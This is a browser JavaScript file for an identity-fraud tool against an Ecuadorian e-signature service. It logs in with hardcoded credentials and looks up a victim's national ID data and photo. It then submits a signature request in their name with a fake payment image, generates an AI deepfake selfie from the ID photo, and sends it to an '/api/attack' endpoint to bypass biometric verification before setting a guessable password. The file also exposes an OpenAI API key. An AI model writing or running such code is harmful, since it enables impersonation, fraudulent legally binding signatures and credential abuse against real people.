// ==========================================
// Navegación de Pestañas
// ==========================================
const tabFirma = document.getElementById('tabFirma');
const tabBypass = document.getElementById('tabBypass');
const seccionFirma = document.getElementById('seccionFirma');
const seccionBypass = document.getElementById('seccionBypass');

if (tabFirma && tabBypass) {
  tabFirma.addEventListener('click', () => {
    tabFirma.classList.add('active');
    tabBypass.classList.remove('active');
    seccionFirma.style.display = 'flex';
    seccionBypass.style.display = 'none';
  });

  tabBypass.addEventListener('click', () => {
    tabBypass.classList.add('active');
    tabFirma.classList.remove('active');
    seccionBypass.style.display = 'flex';
    seccionFirma.style.display = 'none';
  });
}

// ==========================================
// Lógica para Inyección de Trámite de Firma
// ==========================================

// Elementos del DOM para la inyección
const inyeccionForm = document.getElementById('inyeccionForm');
const xTokenInput = document.getElementById('xToken');
const nombresInput = document.getElementById('nombres');
const apellidosInput = document.getElementById('apellidos');
const cedulaInput = document.getElementById('cedula');
const rucInput = document.getElementById('ruc');
const codigoDactilarInput = document.getElementById('codigoDactilar');
const celularInput = document.getElementById('celular');
const correoInput = document.getElementById('correo');
const provinciaInput = document.getElementById('provincia');
const ciudadInput = document.getElementById('ciudad');
const parroquiaInput = document.getElementById('parroquia');
const direccionInput = document.getElementById('direccion');
const numeroTramiteInput = document.getElementById('numeroTramite');
const perfilFirmaInput = document.getElementById('perfilFirma');
const valorPagoInput = document.getElementById('valorPago');
const bancoInput = document.getElementById('banco');
const codUserTInput = document.getElementById('codUserT');
const ptoEmisionInput = document.getElementById('ptoEmision');
const fotoPagoFileInput = document.getElementById('fotoPagoFile');
const injectBtn = document.getElementById('injectBtn');
const consoleOutput = document.getElementById('consoleOutput');
const clearConsoleBtn = document.getElementById('clearConsoleBtn');
const autoTokenBtn = document.getElementById('autoTokenBtn');
const vigenciaFirmaSelect = document.getElementById('vigenciaFirma');

// Escuchar cambios en la vigencia seleccionada para actualizar los campos fijos avanzados
if (vigenciaFirmaSelect) {
  vigenciaFirmaSelect.addEventListener('change', () => {
    const selectedOption = vigenciaFirmaSelect.options[vigenciaFirmaSelect.selectedIndex];
    const perfil = selectedOption.value;
    const precio = selectedOption.getAttribute('data-precio');
    
    if (perfilFirmaInput) perfilFirmaInput.value = perfil;
    if (valorPagoInput) valorPagoInput.value = precio;
    
    addLog('system', `Vigencia seleccionada: ${selectedOption.text} (Perfil: ${perfil}, Precio: $${precio})`);
  });
}

// ==========================================
// Autocompletar Token Automáticamente
// ==========================================
async function renovarToken() {
  if (autoTokenBtn) {
    autoTokenBtn.disabled = true;
    autoTokenBtn.innerHTML = '⏳ Obteniendo...';
  }
  addLog('info', 'Obteniendo nuevo token automáticamente desde el servidor...');
  
  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*"
      },
      body: JSON.stringify({
        user: "0706718046",
        password: "0706718046"
      })
    });

    if (!response.ok) {
      throw new Error(`Error en login: ${response.status} ${response.statusText}`);
    }

    const data = await response.json();
    if (data.token) {
      if (xTokenInput) {
        xTokenInput.value = data.token;
      }
      addLog('success', '¡Token renovado y actualizado con éxito!');
      
      // Decodificar y mostrar vencimiento
      try {
        const parts = data.token.split('.');
        if (parts.length === 3) {
          const payloadDecoded = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
          if (payloadDecoded.exp) {
            const expDate = new Date(payloadDecoded.exp * 1000);
            addLog('info', `El nuevo token expira el: ${expDate.toLocaleString()}`);
          }
        }
      } catch (e) {}

    } else {
      addLog('error', 'El servidor no devolvió un token válido.');
      addLog('json', data, true);
    }
  } catch (error) {
    addLog('error', `Error al obtener token inicial: ${error.message}`);
    addLog('warn', 'Nota sobre CORS: Si hay error de conexión, asegúrate de tener activada la extensión de CORS o el navegador sin seguridad.');
  } finally {
    if (autoTokenBtn) {
      autoTokenBtn.disabled = false;
      autoTokenBtn.innerHTML = '🔄 Autocompletar Token';
    }
  }
}

if (autoTokenBtn) {
  autoTokenBtn.addEventListener('click', renovarToken);
}

// Ejecutar automáticamente al cargar/refrescar la página
window.addEventListener('DOMContentLoaded', renovarToken);

// Nuevos elementos para búsqueda automática de cédula
const buscarCedulaBtn = document.getElementById('buscarCedulaBtn');
const fotoCedulaContainer = document.getElementById('fotoCedulaContainer');
const fotoCedulaImg = document.getElementById('fotoCedulaImg');
const fotoCedulaNombre = document.getElementById('fotoCedulaNombre');

let fotoPagoBase64 = "";
let fotoPagoMimetype = "";

// Imagen JPEG blanca mínima de 1x1 píxeles para envío por defecto
const DEFAULT_FOTO_PAGO = "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=";

// Función para agregar logs en la consola virtual
function addLog(type, message, isJson = false) {
  const timestamp = new Date().toLocaleTimeString();
  const logItem = document.createElement('div');
  
  if (isJson) {
    logItem.className = 'json-log';
    logItem.textContent = typeof message === 'object' ? JSON.stringify(message, null, 2) : message;
  } else {
    logItem.className = `${type}-log`;
    logItem.textContent = `[${timestamp}] ${message}`;
  }
  
  consoleOutput.appendChild(logItem);
  consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

// Convertir archivo de pago subido a Base64 dinámicamente
fotoPagoFileInput.addEventListener('change', (e) => {
  const file = e.target.files[0];
  if (!file) {
    fotoPagoBase64 = "";
    fotoPagoMimetype = "";
    addLog('system', 'Comprobante de pago removido. Se usará la imagen demo por defecto.');
    return;
  }

  addLog('info', `Procesando archivo de pago: ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`);
  
  const reader = new FileReader();
  reader.onload = function(event) {
    const dataUrl = event.target.result;
    const base64Parts = dataUrl.split(',');
    
    fotoPagoBase64 = base64Parts[1] || "";
    fotoPagoMimetype = file.type;
    
    addLog('success', `Archivo de pago procesado y listo. Codificado en Base64 con tipo: ${fotoPagoMimetype}`);
  };
  
  reader.onerror = function() {
    addLog('error', 'Error al leer el archivo seleccionado. Prueba con otra imagen.');
    fotoPagoFileInput.value = '';
  };
  
  reader.readAsDataURL(file);
});

// Manejo de envío del formulario (Inyección)
inyeccionForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  injectBtn.classList.add('loading');
  injectBtn.disabled = true;
  
  addLog('info', 'Iniciando proceso de inyección de trámite...');
  
  const token = xTokenInput.value.trim();
  
  // Validar y decodificar x-token (JWT) para alertar expiración
  try {
    const parts = token.split('.');
    if (parts.length === 3) {
      const payloadDecoded = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      if (payloadDecoded.exp) {
        const expDate = new Date(payloadDecoded.exp * 1000);
        const now = new Date();
        addLog('info', `Token JWT detectado de: "${payloadDecoded.nombre || 'Operador Desconocido'}"`);
        if (now > expDate) {
          addLog('warn', `¡ATENCIÓN! El token que estás usando ya expiró el ${expDate.toLocaleString()}. La API probablemente responderá con error de autorización.`);
        } else {
          addLog('info', `El token expira el: ${expDate.toLocaleString()}`);
        }
      }
    }
  } catch (err) {
    addLog('warn', 'El x-token ingresado no parece ser un JWT válido o no se pudo decodificar. Se enviará sin validar.');
  }

  // Estructura idéntica de la solicitud analizada
  const payload = {
    apellidos: apellidosInput.value.trim(),
    api_regla_codigo: "PN_BIOMETRIA_CEDULA",
    appointmentExpirationDate: "",
    archivo_aceptacion: "",
    archivo_constitucion: "",
    archivo_nombramiento: "",
    archivo_ruc: "",
    banco: bancoInput.value.trim(),
    cargo: "",
    cedula: cedulaInput.value.trim(),
    celular: celularInput.value.trim(),
    ciudad: ciudadInput.value.trim(),
    clavefirma: "",
    codUnico: "",
    codUserT: codUserTInput.value.trim(),
    codigo_dactilar: codigoDactilarInput.value.trim(),
    comentario: "",
    correo: correoInput.value.trim(),
    direccion: direccionInput.value.trim(),
    edad: 32,
    emisor: "Enext",
    foto_frontal: "",
    foto_pago: fotoPagoBase64 || DEFAULT_FOTO_PAGO,
    foto_posterior: "",
    foto_selfie: "",
    funcionJudicial: false,
    localizador: "",
    minetype_aceptacion: "",
    minetype_constitucion: "",
    minetype_foto_frontal: "",
    minetype_foto_pago: fotoPagoMimetype || "image/jpeg",
    minetype_foto_posterior: "",
    minetype_foto_selfie: "",
    minetype_nombramiento: "",
    minetype_ruc: "",
    minetype_video: "",
    nombres: nombresInput.value.trim(),
    notificarEmisionDuplicado: true,
    numero_tramite: numeroTramiteInput.value.trim(),
    parroquia: parroquiaInput.value.trim(),
    perfil_firma: perfilFirmaInput.value.trim(),
    promocion: "No Aplica",
    proveedor_configurado: "Enext",
    provincia: provinciaInput.value.trim(),
    ptoEmision: ptoEmisionInput.value.trim(),
    recurrencia: "",
    ruc: rucInput.value.trim(),
    tipoPersona: "natural",
    tipo_clave: 0,
    tipo_documento: "CEDULA",
    tipo_tramitacion: "Biometria",
    valorPago: valorPagoInput.value.trim(),
    video: ""
  };

  addLog('info', 'Enviando petición POST a: https://apifirmas.firmasecuador.com/api/firmas/tramitarFirma');
  addLog('info', 'Payload enviado:');
  addLog('json', payload, true);

  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/firmas/tramitarFirma", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*",
        "x-token": token
      },
      body: JSON.stringify(payload)
    });

    addLog('info', `Respuesta HTTP recibida: ${response.status} ${response.statusText}`);

    const data = await response.json();
    addLog('success', 'Cuerpo JSON de la respuesta:');
    addLog('json', data, true);

    if (data.codigo === "1" || data.link_biometria) {
      addLog('success', '¡Trámite inyectado con éxito! Se ha generado el enlace de biometría.');
      
      if (data.link_biometria) {
        // Autocompletar el link en el módulo de Bypass
        if (typeof bypassLinkInput !== 'undefined') {
          bypassLinkInput.value = data.link_biometria;
          addLog('info', '[BYPASS] Enlace de validación copiado automáticamente al módulo bypass.');
        }
        // Autocompletar el link en la sección de Contraseña (solo el token)
        if (typeof passLinkInput !== 'undefined' && passLinkInput) {
          try {
            const urlObj = new URL(data.link_biometria);
            passLinkInput.value = urlObj.searchParams.get('token') || data.link_biometria;
          } catch {
            passLinkInput.value = data.link_biometria;
          }
          addLog('info', '[PASS] Token copiado automáticamente al campo de contraseña.');
        }
      }

      // Crear un botón interactivo dentro de la consola para ir al enlace (para redundancia)
      const linkBtn = document.createElement('a');
      linkBtn.href = data.link_biometria || '#';
      linkBtn.target = '_blank';
      linkBtn.className = 'action-btn-link';
      linkBtn.innerHTML = '<span>🔗 Ir a validación biométrica Enext</span>';
      
      consoleOutput.appendChild(linkBtn);
      consoleOutput.scrollTop = consoleOutput.scrollHeight;
    } else {
      addLog('error', `La API devolvió un estado de error: ${data.mensaje || 'Sin mensaje'}`);
    }

  } catch (error) {
    addLog('error', `Error durante el envío de la solicitud: ${error.message}`);
  } finally {
    injectBtn.classList.remove('loading');
    injectBtn.disabled = false;
  }
});

// Limpieza de Logs
clearConsoleBtn.addEventListener('click', () => {
  consoleOutput.innerHTML = '';
  addLog('system', 'Consola limpia. Lista para inyección...');
});

// ==================================================
// Lógica para Consulta y Autocompletado de Cédula
// ==================================================

// Función para separar nombres y apellidos dinámicamente
function separarNombresYApellidos(nombreCompleto) {
  const partes = nombreCompleto.trim().split(/\s+/);
  if (partes.length >= 4) {
    // e.g. "CENTENO HOLGUIN KEVIN JULIAN" -> apellidos: "CENTENO HOLGUIN", nombres: "KEVIN JULIAN"
    const apellidos = partes.slice(0, 2).join(' ');
    const nombres = partes.slice(2).join(' ');
    return { nombres, apellidos };
  } else if (partes.length === 3) {
    // Asumimos primer apellido y el resto nombres
    const apellidos = partes[0];
    const nombres = partes.slice(1).join(' ');
    return { nombres, apellidos };
  } else if (partes.length === 2) {
    return { apellidos: partes[0], nombres: partes[1] };
  }
  return { nombres: nombreCompleto, apellidos: '' };
}

async function consultarCedula(isBypass = false) {
  // Manejo dual: si la consulta viene de bypass o del formulario derecho
  const inputTarget = isBypass && typeof bypassCedulaInput !== 'undefined' ? bypassCedulaInput : cedulaInput;
  const btnTarget = isBypass && typeof bypassBuscarCedulaBtn !== 'undefined' ? bypassBuscarCedulaBtn : buscarCedulaBtn;
  
  const cedula = inputTarget.value.trim();
  const token = xTokenInput.value.trim();

  if (!cedula) {
    addLog('warn', 'Por favor, ingresa un número de cédula válido para consultar.');
    return;
  }

  addLog('info', `Iniciando consulta de cédula: ${cedula}...`);
  btnTarget.disabled = true;
  btnTarget.innerHTML = '⏳';
  btnTarget.classList.add('loading');

  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/usuarios/consultarCedulaPublica", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*"
      },
      body: JSON.stringify({ cedula })
    });

    addLog('info', `Respuesta HTTP recibida de consultarCedula: ${response.status} ${response.statusText}`);

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Error en la consulta: ${response.status}. ${errorText}`);
    }

    const data = await response.json();
    addLog('success', 'Datos obtenidos de consultarCedula:');
    addLog('json', data, true);

    if (data.identificacion) {
      if (isBypass && typeof bypassNombreCompleto !== 'undefined') {
        bypassNombreCompleto.textContent = data.nombres || data.identificacion;
      }
      
      // 1. Separar nombres y apellidos
      let primerApellido = "";
      if (data.nombres) {
        const { nombres, apellidos } = separarNombresYApellidos(data.nombres);
        nombresInput.value = nombres;
        apellidosInput.value = apellidos;
        primerApellido = apellidos.split(' ')[0] || "";
      }

      // 2. Establecer RUC (Cédula + 001)
      rucInput.value = `${data.identificacion}001`;

      // 3. Autocompletar Nueva Contraseña (Primer Apellido + Últimos 4 de Cédula)
      if (primerApellido && data.identificacion) {
        const last4 = data.identificacion.slice(-4);
        const autoPass = `${primerApellido}${last4}`;
        const passInput = document.getElementById('newPassInput');
        if (passInput) {
          passInput.value = autoPass;
        }
      }

      // 3. Código dactilar
      if (data.codigoDactilar) {
        codigoDactilarInput.value = data.codigoDactilar;
      }

      // 4. Ubicación (lugarNacimiento)
      // e.g. "GUAYAS/GUAYAQUIL/BOLIVAR (SAGRARIO)"
      if (data.lugarNacimiento) {
        const partesLugar = data.lugarNacimiento.split('/');
        if (partesLugar.length >= 1) provinciaInput.value = partesLugar[0].trim();
        if (partesLugar.length >= 2) ciudadInput.value = partesLugar[1].trim();
        if (partesLugar.length >= 3) {
          parroquiaInput.value = partesLugar[2].trim();
          direccionInput.value = partesLugar[2].trim(); // Por defecto usamos la parroquia
        }
      }

      // 5. Mostrar la foto
      if (data.foto) {
        const srcPrefix = data.foto.startsWith('data:') ? '' : 'data:image/jpeg;base64,';
        const fullFotoSrc = srcPrefix + data.foto;
        
        // Cargar foto en el formulario
        fotoCedulaImg.src = fullFotoSrc;
        fotoCedulaNombre.textContent = `Foto de ${data.nombres || data.identificacion}`;
        fotoCedulaContainer.style.display = 'flex';
        
        // Actualizar foto sistema en comparativa de Bypass
        if (bypassFotoSistema) {
          bypassFotoSistema.src = fullFotoSrc;
          bypassFotoSistema.style.display = 'block';
          if (bypassFotoSistemaPlaceholder) bypassFotoSistemaPlaceholder.style.display = 'none';
        }

        // Asignar como imagen base de referencia
        bypassBase64Image = fullFotoSrc;
        if (bypassFotoPreview) {
          bypassFotoPreview.src = fullFotoSrc;
        }
        if (typeof bypassBase64Input !== 'undefined' && bypassBase64Input) {
          // Solo mostrar el raw base64 en la caja de texto, quitando el prefijo si existe
          bypassBase64Input.value = data.foto.replace(/^data:image\/\w+;base64,/, '');
        }
        
        addLog('success', 'Foto del usuario cargada con éxito en los paneles.');
      } else {
        fotoCedulaContainer.style.display = 'none';
        addLog('warn', 'No se encontró foto de cédula en la respuesta del API.');
      }

      addLog('success', 'Formulario autocompletado con éxito.');
    } else {
      addLog('error', 'La API no devolvió datos válidos de identificación.');
    }

  } catch (error) {
    addLog('error', `Error al consultar cédula: ${error.message}`);
  } finally {
    btnTarget.disabled = false;
    btnTarget.innerHTML = 'Buscar';
    btnTarget.classList.remove('loading');
  }
}

// Listeners para consulta de cédula principal (derecha)
buscarCedulaBtn.addEventListener('click', () => consultarCedula(false));
cedulaInput.addEventListener('keypress', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    consultarCedula(false);
  }
});

// ==================================================
// Lógica para Simulación de Validación (Bypass) tribu.js
// ==================================================

const bypassCedulaInput = document.getElementById('bypassCedulaInput');
const bypassBuscarCedulaBtn = document.getElementById('bypassBuscarCedulaBtn');
const bypassNombreCompleto = document.getElementById('bypassNombreCompleto');

if (bypassBuscarCedulaBtn) {
  bypassBuscarCedulaBtn.addEventListener('click', () => consultarCedula(true));
}
if (bypassCedulaInput) {
  bypassCedulaInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      consultarCedula(true);
    }
  });
}

const bypassLinkInput = document.getElementById('bypassLink');
const bypassBase64Input = document.getElementById('bypassBase64Input');
const bypassFotoFile = document.getElementById('bypassFotoFile');
const bypassFotoPreview = document.getElementById('bypassFotoPreview');
const bypassPreviewWrapper = document.getElementById('bypassPreviewWrapper');
const bypassBtn = document.getElementById('bypassBtn');

const bypassFotoSistema = document.getElementById('bypassFotoSistema');
const bypassFotoSistemaPlaceholder = document.getElementById('bypassFotoSistemaPlaceholder');
const bypassFotoGenerada = document.getElementById('bypassFotoGenerada');
const bypassFotoGeneradaPlaceholder = document.getElementById('bypassFotoGeneradaPlaceholder');

const passLinkInput = document.getElementById('passLinkInput');
const enviarPassBtn = document.getElementById('enviarPassBtn');
const newPassInput = document.getElementById('newPassInput');

let bypassBase64Image = null;

// Función para extraer token de una URL o cadena
function extraerTokenDeUrl(inputStr) {
  if (!inputStr) return '';
  const trimmed = inputStr.trim();
  try {
    const url = new URL(trimmed);
    const token = url.searchParams.get('token');
    if (token) return token;
  } catch (e) {
    const match = trimmed.match(/[?&]token=([^&]+)/);
    if (match && match[1]) return decodeURIComponent(match[1]);
  }
  return trimmed;
}

// Auto-completar el token de autenticación cuando el usuario escribe o pega el link
if (bypassLinkInput) {
  const syncToken = () => {
    const token = extraerTokenDeUrl(bypassLinkInput.value);
    if (token && passLinkInput) {
      passLinkInput.value = token;
    }
  };
  bypassLinkInput.addEventListener('input', syncToken);
  bypassLinkInput.addEventListener('paste', () => setTimeout(syncToken, 50));
}

// Sincronizar el textarea de Base64 con la imagen del sistema manualmente
const copyBase64Btn = document.getElementById('copyBase64Btn');
if (copyBase64Btn && bypassBase64Input) {
  copyBase64Btn.addEventListener('click', () => {
    const textToCopy = bypassBase64Input.value.trim();
    if (textToCopy) {
      navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = copyBase64Btn.textContent;
        copyBase64Btn.textContent = '¡Copiado!';
        copyBase64Btn.style.color = '#2dd4bf';
        copyBase64Btn.style.borderColor = '#2dd4bf';
        setTimeout(() => {
          copyBase64Btn.textContent = originalText;
          copyBase64Btn.style.color = '#94a3b8';
          copyBase64Btn.style.borderColor = '#334155';
        }, 2000);
      }).catch(err => {
        addLog('error', 'Error al copiar al portapapeles: ' + err.message);
      });
    }
  });
}

if (bypassBase64Input) {
  bypassBase64Input.addEventListener('input', () => {
    let val = bypassBase64Input.value.trim();
    if (val) {
      // Si no tiene el prefijo de data URI, lo agregamos para que la imagen pueda renderizar
      if (!val.startsWith('data:')) {
        val = 'data:image/jpeg;base64,' + val;
      }
      bypassBase64Image = val;
      if (bypassFotoSistema) {
        bypassFotoSistema.src = val;
        bypassFotoSistema.style.display = 'block';
        if (bypassFotoSistemaPlaceholder) bypassFotoSistemaPlaceholder.style.display = 'none';
      }
      if (bypassFotoPreview) {
        bypassFotoPreview.src = val;
      }
      addLog('info', 'Foto Sistema actualizada manualmente desde el texto Base64 puro.');
    }
  });
}

// Cuando el usuario sube una foto manualmente para el bypass
bypassFotoFile.addEventListener('change', function(e) {
  const file = e.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function(e) {
      bypassBase64Image = e.target.result;
      if (bypassFotoGenerada) {
        bypassFotoGenerada.src = bypassBase64Image;
        bypassFotoGenerada.style.display = 'block';
        if (bypassFotoGeneradaPlaceholder) bypassFotoGeneradaPlaceholder.style.display = 'none';
      }
      if (bypassFotoPreview) {
        bypassFotoPreview.src = bypassBase64Image;
        bypassFotoPreview.style.display = 'block';
      }
      addLog('info', 'Foto manual cargada para el bypass biométrico.');
    }
    reader.readAsDataURL(file);
  }
});

// Enviar ataque bypass
bypassBtn.addEventListener('click', async () => {
  const link = bypassLinkInput.value.trim();
  
  if (!link || !bypassBase64Image) {
    addLog('warn', '[BYPASS] Faltan datos. Necesitas el enlace generado y una foto base64.');
    return;
  }
  
  let token = extraerTokenDeUrl(link);
  if (!token) {
    addLog('error', '[BYPASS] Enlace inválido o falta token en el enlace.');
    return;
  }

  // Auto-completar automáticamente el token en la sección de contraseña
  if (passLinkInput) {
    passLinkInput.value = token;
  }

  bypassBtn.classList.add('loading');
  bypassBtn.disabled = true;

  let bypassToken = '';

  try {
    addLog('info', '[BYPASS] Enviando ataque al servidor unificado (/api/attack)...');

    // Enviamos la petición al mismo puerto que aloja la página web
    const response = await fetch('/api/attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, foto: bypassBase64Image })
    });
    
    const data = await response.json();
    
    if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true') || data.body.includes('\u00c9xito') || data.body.includes('Exito'))) {
      addLog('success', '[BYPASS - \u00c9XITO] \u00a1Ataque exitoso! La validación biométrica ha sido aprobada.');
      addLog('error', `Respuesta: Status ${data.status} - Body: ${data.body}`);

      // Guardar el token para usarlo en el envio de contraseña
      bypassToken = token;

      // Mostrar la sección de contraseña
      const passwordSection = document.getElementById('passwordSection');
      if (passwordSection) passwordSection.style.display = 'block';
    } else {
      addLog('warn', '[BYPASS - BLOQUEADO] El servidor rechazó la foto o falló.');
      addLog('warn', `Respuesta: Status ${data.status} - Body: ${data.body}`);
    }
  } catch (err) {
    addLog('error', '[BYPASS] Error de conexión con el servidor. ' + err.message);
  } finally {
    bypassBtn.classList.remove('loading');
    bypassBtn.disabled = false;
  }

  // Guardar token globalmente para el botón de contraseña
  window._bypassToken = bypassToken;
});

// ==================================================
// Envío de Contraseña tras Bypass Exitoso
// ==================================================

if (enviarPassBtn) {
  enviarPassBtn.addEventListener('click', async () => {
    // Usar el valor del campo directamente como token
    const token = passLinkInput ? passLinkInput.value.trim() : '';

    const newPass = newPassInput ? newPassInput.value.trim() : '';

    if (!token) {
      addLog('warn', '[PASS] Ingresa el enlace de validación con el token antes de enviar.');
      return;
    }
    if (!newPass) {
      addLog('warn', '[PASS] Por favor ingresa una contraseña antes de enviar.');
      return;
    }

    addLog('info', `[PASS] Enviando contraseña al servidor...`);
    enviarPassBtn.classList.add('loading');
    enviarPassBtn.disabled = true;

    try {
      const response = await fetch('/api/set-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, newPass })
      });

      const data = await response.json();

      let bodyParsed;
      try { bodyParsed = JSON.parse(data.body); } catch { bodyParsed = data.body; }

      if (data.status === 200 && (bodyParsed === true || bodyParsed?.ok === true || data.body.includes('true'))) {
        addLog('success', `[PASS - \u00c9XITO] \u00a1Contraseña guardada correctamente! Respuesta: ${data.body}`);
      } else {
        addLog('warn', `[PASS] El servidor respondió con un estado inesperado. Status: ${data.status} - Body: ${data.body}`);
      }
    } catch (err) {
      addLog('error', '[PASS] Error de conexión al enviar contraseña: ' + err.message);
    } finally {
      enviarPassBtn.classList.remove('loading');
      enviarPassBtn.disabled = false;
    }
  });
}

// ==================================================
// Lógica del Generador de Imágenes IA (gpt-image-2)
// ==================================================

const generateAIBtn = document.getElementById('generateAIBtn');

const DEFAULT_AI_PROMPT = `Create a highly realistic smartphone selfie of the person shown in the reference image. IMPORTANT: Preserve the identity, facial structure, facial proportions, eye shape, nose shape, lips, jawline, skin tone, hairstyle, eyebrows, and overall appearance of the reference person. Maintain strong facial consistency with the reference image. The generated image should clearly look like the same individual. Shot with a modern iPhone front-facing camera. Slightly low camera angle, direct eye contact with the camera, neutral natural expression. Natural indoor lighting coming from a nearby window. Realistic shadows and highlights. Authentic smartphone HDR processing. Shallow depth of field with realistic portrait mode background blur. Soft bokeh. Natural room environment in the background, slightly messy and out of focus to create depth. Ultra realistic skin texture, visible pores, natural imperfections, realistic eyes, detailed hair strands, realistic facial details. No beauty filters, no retouching, no airbrushing, no professional studio lighting. Amateur smartphone photography style. Handheld shot.Slight camera noise. Natural exposure. Realistic color science. Photorealistic, RAW photo, extremely detailed, realistic depth, realistic lighting, realistic proportions, authentic smartphone selfie. 1:1 aspect ratio . NO PHONe`;

if (generateAIBtn) {
  generateAIBtn.addEventListener('click', async () => {
    if (!bypassBase64Image) {
      addLog('warn', '[IA] No hay ninguna foto cargada. Consulta una cédula o sube una imagen manual para usarla como base.');
      return;
    }
    
    generateAIBtn.classList.add('loading');
    generateAIBtn.disabled = true;
    
    try {
      addLog('info', '[IA] Generando selfie realista con gpt-image-2 a partir de la foto del sistema...');
      
      // Función auxiliar para convertir Base64 a Blob
      const byteCharacters = atob(bypassBase64Image.replace(/^data:image\/\w+;base64,/, ''));
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const imageBlob = new Blob([byteArray], { type: 'image/jpeg' });

      const openAIKey = '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';

      const formData = new FormData();
      formData.append('model', 'gpt-image-2');
      formData.append('prompt', DEFAULT_AI_PROMPT);
      formData.append('image', imageBlob, 'reference.jpg');

      addLog('info', '[IA] Enviando petición a OpenAI API (/v1/images/edits)...');

      const response = await fetch('https://api.openai.com/v1/images/edits', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${openAIKey}`
        },
        body: formData
      });
      
      const data = await response.json();
      
      if (data.error) {
        throw new Error(`OpenAI gpt-image-2 Error: ${data.error.message || JSON.stringify(data.error)}`);
      }
      
      let generatedImageUrl = null;
      if (data.data && data.data[0]) {
        if (data.data[0].b64_json) {
          generatedImageUrl = `data:image/jpeg;base64,${data.data[0].b64_json}`;
        } else if (data.data[0].url) {
          generatedImageUrl = data.data[0].url;
        }
      }
      
      if (generatedImageUrl) {
        // Actualizar automáticamente la foto de Bypass en la comparativa
        if (bypassFotoGenerada) {
          bypassFotoGenerada.src = generatedImageUrl;
          bypassFotoGenerada.style.display = 'block';
          if (bypassFotoGeneradaPlaceholder) bypassFotoGeneradaPlaceholder.style.display = 'none';
        }
        bypassBase64Image = generatedImageUrl;

        addLog('success', '[IA] ¡Selfie generado con éxito con gpt-image-2 y cargado en Bypass!');
      } else {
        addLog('error', '[IA] No se encontró la imagen en la respuesta de OpenAI.');
        addLog('json', data, true);
      }
      
    } catch (err) {
      addLog('error', '[IA] Falló la generación de imagen con gpt-image-2: ' + err.message);
    } finally {
      generateAIBtn.classList.remove('loading');
      generateAIBtn.disabled = false;
    }
  });
}
